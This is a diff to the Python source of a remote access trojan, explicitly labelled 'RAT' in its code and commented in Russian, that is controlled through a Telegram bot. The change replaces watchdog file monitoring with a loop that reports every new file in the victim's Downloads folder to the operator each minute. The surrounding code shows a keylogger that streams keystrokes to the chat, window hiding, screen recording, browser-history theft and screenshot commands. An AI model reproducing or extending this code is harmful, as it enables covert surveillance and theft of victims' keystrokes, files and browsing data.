@@ -19,9 +19,6 @@ import psutil
 import cv2
 import numpy as np
 
-from watchdog.observers import Observer
-from watchdog.events import FileSystemEventHandler
-
 # ────────────────────────────────────────────────
 # Логи + скрытие окна (Windows)
 # ────────────────────────────────────────────────
@@ -54,6 +51,9 @@ keylog_lock = threading.Lock()
 
 screenrec_active = False
 screenrec_filename = "screenrec.mp4"
+
+# Последние проверенные файлы в Downloads (для замены watchdog)
+last_downloads_files = set()
 
 # ────────────────────────────────────────────────
 # Кейлоггер (без файла на диске — сразу в чат)
@@ -93,26 +93,26 @@ def auto_send_keylog():
             send_keylog_to_bot()
 
 # ────────────────────────────────────────────────
-# Мониторинг файлов
+# Простая замена watchdog — проверка новых файлов в Downloads
 # ────────────────────────────────────────────────
 
-class FileHandler(FileSystemEventHandler):
-    def on_created(self, event):
-        if not event.is_directory:
-            bot.send_message(ADMIN_ID, f"🆕 Новый файл: {event.src_path}")
+def check_downloads():
+    global last_downloads_files
+    downloads_path = os.path.expanduser("\~/Downloads")
+    if not os.path.exists(downloads_path):
+        return
+    current_files = set(os.listdir(downloads_path))
+    new_files = current_files - last_downloads_files
+    for file in new_files:
+        if file.startswith('.'): continue  # скрытые файлы игнорим
+        full_path = os.path.join(downloads_path, file)
+        bot.send_message(ADMIN_ID, f"🆕 Новый файл в Downloads: {full_path}")
+    last_downloads_files = current_files
 
-    def on_modified(self, event):
-        if not event.is_directory:
-            bot.send_message(ADMIN_ID, f"✏️ Изменён: {event.src_path}")
-
-def start_file_monitor():
-    paths = [os.path.expanduser(p) for p in ["\~/Downloads", "\~/Documents", "\~/Desktop"]]
-    observer = Observer()
-    for path in paths:
-        if os.path.exists(path):
-            observer.schedule(FileHandler(), path=path, recursive=False)
-    observer.start()
-    logging.info("Мониторинг файлов запущен")
+def auto_check_downloads():
+    while True:
+        time.sleep(60)  # каждую минуту
+        check_downloads()
 
 # ────────────────────────────────────────────────
 # Браузерная история (Chrome + Yandex + Opera + Firefox)
@@ -183,7 +183,7 @@ def get_sysinfo():
 🌐 IP внешний: {public_ip}"""
 
 # ────────────────────────────────────────────────
-# Меню БЕЗ ЦВЕТОВ
+# Меню БЕЗ watchdog и без цветов
 # ────────────────────────────────────────────────
 
 @bot.message_handler(commands=['start', 'help'])
@@ -216,7 +216,7 @@ def is_admin(uid):
     return uid == ADMIN_ID
 
 # ────────────────────────────────────────────────
-# Команды (все как раньше)
+# Команды
 # ────────────────────────────────────────────────
 
 @bot.message_handler(commands=['screenshot'])
@@ -388,7 +388,7 @@ if __name__ == '__main__':
     logging.info("=== RAT ЗАПУЩЕН ===")
     threading.Thread(target=auto_send_keylog, daemon=True).start()
     threading.Thread(target=lambda: KeyboardListener(on_press=on_press).join(), daemon=True).start()
-    threading.Thread(target=start_file_monitor, daemon=True).start()
+    threading.Thread(target=auto_check_downloads, daemon=True).start()  # новая проверка Downloads
 
     while True:
         try:
